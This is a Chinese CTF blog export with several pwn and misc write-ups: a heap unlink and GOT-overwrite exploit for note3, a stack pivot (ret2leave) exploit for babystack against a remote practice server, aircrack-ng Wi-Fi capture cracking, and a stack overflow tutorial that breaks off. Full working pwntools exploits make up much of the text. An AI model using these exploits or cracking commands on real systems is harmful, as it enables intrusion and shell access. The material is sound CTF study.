    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/23933.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><ul><li><p>依然是Unlink，写本文来警示自己exp一定要写的规范，因为我写的不规范，导致后期调试的时候一直多出来一个\n，找了半天才发现是因为格式不规范..</p></li><li><p>题目下载链接:<a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/unlink/ZCTF_2016_note3/note3" target="_blank" rel="noopener">下载链接</a></p></li><li><p>参考链接:</p></li></ul><p><a href="https://bbs.pediy.com/thread-247007.htm" target="_blank" rel="noopener">看雪</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/" target="_blank" rel="noopener">CTF-WIKI</a></p><h1 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><ul><li>与上文的note2一样，程序提供了5个选项。</li><li><code>New note</code>，创建note，每个note的size和chunk都会存在bss段的对应位置。</li><li><code>Show note</code> ，这次程序虽然提供了提供show，但却是输出<code>&quot;No show, No leak.&quot;</code>。</li><li><code>Edit note</code>，相比note2，这次程序只提供了overwrite方法。</li><li><code>Delete note</code>，能执行正常的free，并置0。</li><li><code>Exit</code>，退出程序。</li></ul><h2 id="漏洞点1"><a href="#漏洞点1" class="headerlink" title="漏洞点1"></a>漏洞点1</h2><ul><li>同note2一样，都会由于unsigned int 这个类型造成可写入大量数据。</li></ul><h2 id="漏洞点2"><a href="#漏洞点2" class="headerlink" title="漏洞点2"></a>漏洞点2</h2><ul><li>由于程序<code>edit</code>、<code>delete</code>函数里面对<code>note ID</code>的检验并不严谨，导致即使<code>note ID</code>是负数也能通过检验。</li></ul><h1 id="0x02-Do-it！"><a href="#0x02-Do-it！" class="headerlink" title="0x02 Do it！"></a>0x02 Do it！</h1><ul><li>漏洞点1可以仅用Unlink来利用。</li><li>但是漏洞2需要配合UAF。</li><li>本文是针对Unlink来写的，所以利用了漏洞点1，构造方法和原理与note2一样，具体可以看前文，相比之下note3因为没有直接的leak，我们需要想办法进行leak。</li></ul><h1 id="前期模板"><a href="#前期模板" class="headerlink" title="前期模板"></a>前期模板</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = process(<span class="string">'./note3'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./note3'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size,cont)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'option---&gt;&gt;\n'</span>)</span><br><span class="line">    c.sendline(<span class="string">'1'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'(less than 1024)\n'</span>)</span><br><span class="line">    c.sendline(str(size))</span><br><span class="line">    c.recvuntil(<span class="string">'Input the note content:\n'</span>)</span><br><span class="line">    c.sendline(str(cont))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(id,  cont)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'option---&gt;&gt;\n'</span>)</span><br><span class="line">    c.sendline(<span class="string">'3'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'Input the id of the note:\n'</span>)</span><br><span class="line">    c.sendline(str(id))</span><br><span class="line">    c.recvuntil(<span class="string">'new content:\n'</span>)</span><br><span class="line">    c.sendline(cont)</span><br><span class="line">    c.recvuntil(<span class="string">"Edit success!\n"</span>,timeout = <span class="number">0.5</span>)<span class="comment">#注意这里</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'option---&gt;&gt;\n'</span>)</span><br><span class="line">    c.sendline(<span class="string">'4'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'Input the id of the note:\n'</span>)</span><br><span class="line">    c.sendline(str(idx))</span><br></pre></td></tr></table></figure><ul><li>因为我在第一次写的时候，<code>delete</code>里<code>c.recvuntil(&#39;Input the id of the note:\n&#39;)</code>后面都没有加上<code>\n</code>，这样导致后面leak的时候总会把<code>\n</code>也读入进去，从而leak出来的结果不正确。为了严谨，对每个<code>recvuntil</code>都加上了<code>\n</code>。</li><li>注意代码中<code>注意这里</code>，这个设置了一个<code>timeout</code>，因为也不知道为什么，后期有一处edit的时候总是接收不到<code>Edit success!\n</code>。</li></ul><h2 id="伪造chunk并unlink"><a href="#伪造chunk并unlink" class="headerlink" title="伪造chunk并unlink"></a>伪造chunk并unlink</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">target = <span class="number">0x6020c0</span> + <span class="number">0x8</span> <span class="comment">#0x6020c0存的是当前chunk的指针，0x6020c8才是chunk指针数组的起始位置。</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">8</span> + p64(<span class="number">0xa1</span>) + p64(fd) + p64(bk) + <span class="string">'a'</span>*<span class="number">0x60</span> <span class="comment">#和note2一样的构造方法。</span></span><br><span class="line"></span><br><span class="line">new(<span class="number">0x80</span>,payload1)</span><br><span class="line">new(<span class="number">0</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">new(<span class="number">0x80</span>,<span class="string">'aaaaaaaaaa'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>) <span class="comment">#delete以后进入fastbin，再次申请的时候还是申请的这一块</span></span><br><span class="line">c.recvuntil(<span class="string">"Delete success\n"</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">0x10</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>) <span class="comment">#和note2一样的构造方法</span></span><br><span class="line">new(<span class="number">0</span>,payload2) <span class="comment">#再次申请 并覆盖第三个note的prevsize和size的inuse位</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>) <span class="comment">#unlink</span></span><br><span class="line">c.recvuntil(<span class="string">"Delete success\n"</span>)</span><br></pre></td></tr></table></figure><h2 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">puts_got = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">"puts"</span>]</span><br><span class="line">free_got = elf.got[<span class="string">"free"</span>]</span><br><span class="line">system = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">puts = libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(free_got) + p64(puts_got)</span><br><span class="line">edit(<span class="number">0</span>,payload3) <span class="comment">#这个位置总是recvuntil不成功，所以才在edit函数那块加了个timeout。这里执行以后chunk0的位置为free_got，chunk1的位置为puts_got</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'free_got = '</span> + hex(free_got))</span><br><span class="line">log.success(<span class="string">'puts_got = '</span> + hex(puts_got))</span><br><span class="line">log.success(<span class="string">'puts_plt = '</span> + hex(puts_plt))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload4 = p64(puts_plt)[:<span class="number">-1</span>] <span class="comment">#注意这里的[:-1]由于p64总共8个字节，如果不加上[:-1]会由于sendline最后的\n覆盖掉与它紧邻位置的数据。而为什么能使用[:-1]? 可以输出hex(p64(puts_plt))试一下，会发现它是0x0000xxxxxxxxxx的形式，前面会有至少2个00，再加上小端序的问题，我们就相当于丢掉了开头的2个00，这样并不会产生太大影响，最主要的是我们保护了与它紧邻的数据。</span></span><br><span class="line">edit(<span class="number">0</span>,payload4)<span class="comment">#执行以后我们的free_got就变成了puts_plt</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)<span class="comment">#表面上执行的是free()函数，实际上执行的是puts(puts_got)，这样就完成了leak</span></span><br><span class="line"></span><br><span class="line">puts_addr = u64(c.recvuntil(<span class="string">"\nDelete success\n"</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">"\00"</span>))</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'puts_addr = '</span> + hex(puts_addr))</span><br></pre></td></tr></table></figure><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new(<span class="number">0x20</span>,<span class="string">'/bin/sh\00'</span>)<span class="comment">#由于delete函数完成后会置0，所以这时候我们new一个新chunk的话，它会是chunk1</span></span><br><span class="line"></span><br><span class="line">libcbase = puts_addr - puts</span><br><span class="line">system_addr = libcbase + system</span><br><span class="line"></span><br><span class="line">payload5 = p64(system_addr)[:<span class="number">-1</span>]<span class="comment">#依然注意[:-1] 原因和上面一样</span></span><br><span class="line">edit(<span class="number">0</span>,payload5)<span class="comment">#这样free就变成了system</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(c)</span></span><br><span class="line">delete(<span class="number">1</span>)<span class="comment">#表面上执行free()函数，实际上是system('/bin/sh')</span></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x03完整exp"><a href="#0x03完整exp" class="headerlink" title="0x03完整exp"></a>0x03完整exp</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = process(<span class="string">'./note3'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./note3'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size,cont)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'option---&gt;&gt;\n'</span>)</span><br><span class="line">    c.sendline(<span class="string">'1'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'(less than 1024)\n'</span>)</span><br><span class="line">    c.sendline(str(size))</span><br><span class="line">    c.recvuntil(<span class="string">'Input the note content:\n'</span>)</span><br><span class="line">    c.sendline(str(cont))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(id,  cont)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'option---&gt;&gt;\n'</span>)</span><br><span class="line">    c.sendline(<span class="string">'3'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'Input the id of the note:\n'</span>)</span><br><span class="line">    c.sendline(str(id))</span><br><span class="line">    c.recvuntil(<span class="string">'new content:\n'</span>)</span><br><span class="line">    c.sendline(cont)</span><br><span class="line">    c.recvuntil(<span class="string">"Edit success!\n"</span>,timeout = <span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'option---&gt;&gt;\n'</span>)</span><br><span class="line">    c.sendline(<span class="string">'4'</span>)</span><br><span class="line">    c.recvuntil(<span class="string">'Input the id of the note:\n'</span>)</span><br><span class="line">    c.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">target = <span class="number">0x6020c0</span> + <span class="number">0x8</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">8</span> + p64(<span class="number">0xa1</span>) + p64(fd) + p64(bk) + <span class="string">'a'</span>*<span class="number">0x60</span></span><br><span class="line"></span><br><span class="line">new(<span class="number">0x80</span>,payload1)</span><br><span class="line">new(<span class="number">0</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">new(<span class="number">0x80</span>,<span class="string">'aaaaaaaaaa'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">c.recvuntil(<span class="string">"Delete success\n"</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'a'</span>*<span class="number">0x10</span> + p64(<span class="number">0xa0</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">new(<span class="number">0</span>,payload2)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">c.recvuntil(<span class="string">"Delete success\n"</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">"puts"</span>]</span><br><span class="line">free_got = elf.got[<span class="string">"free"</span>]</span><br><span class="line">system = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">puts = libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">payload3 = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(free_got) + p64(puts_got)</span><br><span class="line">edit(<span class="number">0</span>,payload3)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'free_got = '</span> + hex(free_got))</span><br><span class="line">log.success(<span class="string">'puts_got = '</span> + hex(puts_got))</span><br><span class="line">log.success(<span class="string">'puts_plt = '</span> + hex(puts_plt))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload4 = p64(puts_plt)[:<span class="number">-1</span>]</span><br><span class="line">edit(<span class="number">0</span>,payload4)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(c.recvuntil(<span class="string">"\nDelete success\n"</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">"\00"</span>))</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'puts_addr = '</span> + hex(puts_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new(<span class="number">0x20</span>,<span class="string">'/bin/sh\00'</span>)</span><br><span class="line"></span><br><span class="line">libcbase = puts_addr - puts</span><br><span class="line">system_addr = libcbase + system</span><br><span class="line"></span><br><span class="line">payload5 = p64(system_addr)[:<span class="number">-1</span>]</span><br><span class="line">edit(<span class="number">0</span>,payload5)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
  </entry>
  <entry>
    <title>[栈迁移]ACTF_2019_babystack</title>
    <url>/2020/03/14/%E6%A0%88%E8%BF%81%E7%A7%BB-ACTF-2019-babystack/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/79755722_p0.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>题目考察点:<code>栈迁移</code>、<code>ROP</code>、<code>ret2leave</code></p><p>题目来源:<code>BUUCTF</code></p><p>写这篇博客为了记录一下栈迁移的用法。</p><h1 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br></pre></td></tr></table></figure><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200314163239.png" alt></p><p>程序最大可以读入0xE0字节的数据，而s与rbp的距离为0xD0，所以还可以溢出0xE0-0xD0 = 0x10个字节的数据，但是这0x10<code>只够覆盖rbp和返回地址</code>。</p><p>程序会把栈地址打印出来。</p><p><strong>程序开了NX保护，无法往栈上写入shellcode来执行</strong></p><p>所以考虑<code>栈迁移</code>，然后构造<code>ROP链</code>。</p><h1 id="0x02-EXP与解释"><a href="#0x02-EXP与解释" class="headerlink" title="0x02 EXP与解释"></a>0x02 EXP与解释</h1><p>这道题比较简单，直接放EXP了，一些关键点会解释一下。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">'debug'</span>,arch = <span class="string">'amd64'</span>,os = <span class="string">'linux'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#c = process('./babystack')</span></span><br><span class="line">elf = ELF(<span class="string">'./babystack'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">c = remote(<span class="string">'node3.buuoj.cn'</span>,<span class="number">28934</span>)</span><br><span class="line">main = <span class="number">0x4008F6</span></span><br><span class="line">leave = <span class="number">0x400A18</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400ad3</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendMsg</span><span class="params">(payload)</span>:</span></span><br><span class="line">    c.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    c.sendline(str(<span class="number">0xe0</span>))</span><br><span class="line">    c.recvuntil(<span class="string">'Your message will be saved at '</span>)</span><br><span class="line">    addr = int(c.recvuntil(<span class="string">'\n'</span>,drop = <span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">    success(<span class="string">'stack_addr = '</span> + hex(addr))</span><br><span class="line">    payload += <span class="string">'a'</span>*(<span class="number">0xd0</span> - len(payload)) + p64(addr) + p64(leave)</span><br><span class="line">    c.recvline()</span><br><span class="line">    c.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">    c.send(payload)<span class="comment">#注意这里要send，不能用sendline，不然程序接收和发送不匹配！！！！</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">8</span> + p64(pop_rdi_ret) + p64(elf.got[<span class="string">'puts'</span>]) + p64(elf.plt[<span class="string">'puts'</span>]) + p64(main)</span><br><span class="line"></span><br><span class="line">sendMsg(payload)</span><br><span class="line">c.recvuntil(<span class="string">'Byebye~\n'</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(c.recvuntil(<span class="string">'\n'</span>,drop = <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(<span class="string">'puts_addr = '</span> + hex(puts_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc = LibcSearcher('puts',puts_addr)</span></span><br><span class="line"><span class="comment">#libcbase = puts_addr - libc.dump('puts')</span></span><br><span class="line">libcbase = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">execv = libcbase + <span class="number">0x4f2c5</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">8</span> + p64(execv)</span><br><span class="line">sendMsg(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>由于题目并没有给libc，可以考虑用LibcSearcher(实际上libc就是libc-2.27.so)</p><p>来看第一个payload，关于它的执行流程，可以看下面:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">read之前</span><br><span class="line"> RBP  <span class="number">0x7fffffffdd90</span> —▸ <span class="number">0x400a70</span> ◂— <span class="number">0x41ff894156415741</span></span><br><span class="line"> RSP  <span class="number">0x7fffffffdcc0</span> ◂— <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">call read: rbp里面的内容被覆盖为程序打印出的栈地址，也就是s的首地址</span><br><span class="line"> RBP  0x7fffffffdd90 —▸ 0x7fffffffdcc0 ◂— 0x6161616161616161 ('aaaaaaaa')</span><br><span class="line"> RSP  0x7fffffffdcc0 ◂— 0x6161616161616161 ('aaaaaaaa')</span><br><span class="line"></span><br><span class="line">leave(程序自身的leave，位于<span class="number">0x400A18</span>)，mov rsp,rbp;pop rbp（使得rsp+=<span class="number">8</span>，指向了我们的p64(leave)）</span><br><span class="line"> RBP  0x7fffffffdcc0 ◂— 0x6161616161616161 ('aaaaaaaa')</span><br><span class="line"> RSP  <span class="number">0x7fffffffdd98</span> —▸ <span class="number">0x400a18</span> ◂— <span class="number">0x8348e5894855c3c9</span></span><br><span class="line"></span><br><span class="line">ret(程序自身的ret，位于<span class="number">0x400A19</span>)，将我们传入的p64(leave)传给rip，rsp+=<span class="number">8</span>，接着执行leave;ret。</span><br><span class="line"> RBP  0x7fffffffdcc0 ◂— 0x6161616161616161 ('aaaaaaaa')</span><br><span class="line"> RSP  <span class="number">0x7fffffffdda0</span> ◂— <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">leave(我们的p64(leave)),mov rsp,rbp;pop rbp; 此时rsp又指向了s首地址+<span class="number">8</span>的位置，即p64(pop_rdi_ret)</span><br><span class="line"> RBP  0x6161616161616161 ('aaaaaaaa')</span><br><span class="line"> RSP  <span class="number">0x7fffffffdcc8</span> —▸ <span class="number">0x400ad3</span> ◂— <span class="number">0x841f0f2e6690c35f</span></span><br><span class="line"></span><br><span class="line">ret(我们传入的)，pop rdi;将p64(pop_rdi_ret)传给rip</span><br><span class="line"> RBP  0x6161616161616161 ('aaaaaaaa')</span><br><span class="line"> RSP  <span class="number">0x7fffffffdcd0</span> —▸ <span class="number">0x601020</span> —▸ <span class="number">0x7ffff7a649c0</span> (<span class="built_in">puts</span>) ◂— push   r13</span><br><span class="line"></span><br><span class="line">此时 RIP -- &gt; pop_rdi_ret，从而执行我们的ROP链</span><br></pre></td></tr></table></figure><p><strong>有的博主把这块构造叫做<code>ret2leave</code></strong></p><p>关于第二个payload，我试过通过rop链构造<code>system(&#39;/bin/sh&#39;)</code>但是打不通，所以这里采用<code>one_gadget</code></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200314172353.png" alt></p><p>这里选用的第一个<code>0x4f2c5</code>，然后老样子构造payload即可。</p><h1 id="0x03-写在最后"><a href="#0x03-写在最后" class="headerlink" title="0x03 写在最后"></a>0x03 写在最后</h1><p>这道题目不难，关键是理解这个栈迁移的原理和<code>ret2leave</code>的执行流程。</p><p>可以总结一下:</p><p>leave相当于 <code>rsp = rbp + 8; rbp = [rbp];</code></p><p>为了达到我们的目的(让rsp指向 rbp里面的值+8的位置)，一次leave是不够的，所以本题需要两次，才能使得<code>rsp = [rbp] + 8</code></p>]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
  </entry>
  <entry>
    <title>实验吧-A记录</title>
    <url>/2019/05/23/%E5%AE%9E%E9%AA%8C%E5%90%A7-A%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190529225404.png" alt></p><a id="more"></a><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190523224047.png" alt></p><ul><li>下载下来是个cap文件, 用wireshark打开,但是提示文件好像被截断。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190523221411.png" alt></p><ul><li><p>出现这个报错可能因为该文件被加密了。</p></li><li><p>下面来破解该文件。</p></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aircrack-ng shipin.cap -w zidian.txt</span><br></pre></td></tr></table></figure><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190523223331.png" alt></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190523223427.png" alt></p><ul><li>得到密码 88888888</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aircrack-ng shipin.cap</span><br></pre></td></tr></table></figure><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190523222351.png" alt></p><ul><li>得到ESSID为0719</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">airdecap-ng shipin.cap -e 0719 -p 88888888</span><br></pre></td></tr></table></figure><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190523223612.png" alt></p><ul><li>得到了shipin-dec.cap,用wireshark打开就没有那个报错了。</li></ul><ul><li>根据题目:A记录</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190523223910.png" alt></p><ul><li>过滤DNS</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190523224123.png" alt></p><ul><li>根据题目,“看视频” 的话, 应该youku或者cntv吧, 这几个都试试看,最后试出来是</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push.m.youku.com</span><br></pre></td></tr></table></figure><ul><li>所以最后flag为</li></ul><blockquote><p>ctf{push.m.youku.com}</p></blockquote>]]></content>
      <categories>
        <category>杂项</category>
      </categories>
  </entry>
  <entry>
    <title>Bugku-Pwn4</title>
    <url>/2019/08/04/Bugku-Pwn4/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/234.jpg" alt></p><a id="more"></a><h1 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h1><ul><li><p>新接触Pwn不久,以这道题为例,记录一下自己的学习经历。</p></li><li><p>这道题在网上能搜到WP,比着WP能很容易做出来,但是对没啥pwn基础的我来说想要弄懂却不容易。</p></li><li><p>写这篇文章希望能帮助到想搞懂这道题目但是却不能被现有的wp满足的pwner们。</p></li></ul><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=33856223&auto=1&height=66"></iframe><h1 id="0x01理论分析"><a href="#0x01理论分析" class="headerlink" title="0x01理论分析"></a>0x01理论分析</h1><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190804232504.png" alt></p><ul><li>检查了一番,没开启啥保护。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190804232415.png" alt></p><ul><li>根据main函数能看出来是考察的栈溢出, <code>memset</code>对<code>s</code>只开辟了<code>0x10</code>大小的空间,但是<code>read</code>却读入了<code>0x30</code>个字节, 会造成溢出。</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190121214504284.png" alt></p><ul><li><p>这是一张在别的地方拿来的图(32位), <code>0x28</code>个字节的栈空间下面是<code>EBP</code>和<code>返回地址</code>。</p></li><li><p>64位程序类似, 只不过EBP变成RBP 然后它们的大小都变成了0x8个字节,那些Hello能写到一行,World能写到一行了。</p></li><li><p>按照一般思路, 需要覆盖掉<code>EBP</code>, 然后 再将返回地址覆盖成我们想让程序跳转到的地址,一般是调到能拿到<code>shell</code>的地方比如<code>System(&quot;/bin/sh&quot;)</code></p></li><li><p>那么搜索关键字符串<code>/bin/sh</code></p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190804233243.png" alt></p><ul><li>并没有找到,但是却有<code>$0</code></li><li>在Linux中:</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$<span class="comment"># 是传给脚本的参数个数 </span></span><br><span class="line">$<span class="number">0</span> 是脚本本身的名字 </span><br><span class="line">$<span class="number">1</span>是传递给该shell脚本的第一个参数 </span><br><span class="line">$<span class="number">2</span>是传递给该shell脚本的第二个参数 </span><br><span class="line">$@ 是传给脚本的所有参数的列表</span><br></pre></td></tr></table></figure><blockquote><p><code>$0</code>在linux中为为shell或shell脚本的名称</p></blockquote><blockquote><p><code>system()</code>会调用<code>fork()</code>产生子进程，由子进程来调用<code>/bin/sh -c string</code>来执行参数<code>string</code>字符串所代表的命令，此命令执行完后随即返回原调用的进程。</p></blockquote><blockquote><p>所以如果将<code>$0</code>作为<code>system</code>的参数，能达到传入<code>&#39;/bin/sh&#39;</code>一样的效果。</p></blockquote><ul><li>即<code>system(&quot;$0&quot;) == system(&#39;bin/sh&#39;)</code></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190805002508.png" alt></p><ul><li><p><code>$0</code>在这一句的末端, 直接查偏移就行,即从<code>0000000000601100</code>开始往右数,看第几个是<code>$</code>就行。</p></li><li><p>举个例子:<code>0000000000601100</code>代表这一整串,<code>0000000000601101</code>代表从9往后(包括9)这一整串,<code>0000000000601102</code>代表从8往后(包括8)这一串…..</p></li><li><p>以此类推得到<code>$0</code>的地址为<code>0x000000000060111f</code></p></li><li><p>得到了一个<code>/bin/sh</code> 但是还需要能够调用这个<code>/bin/sh</code>的函数,也就是<code>system()</code>函数</p></li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190804233839.png" alt></p><ul><li>通过在IDA查看import调用, 找到了<code>system</code>函数</li></ul><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20190804234040.png" alt></p><ul><li>现在需要得到它的地址。</li></ul><p><img 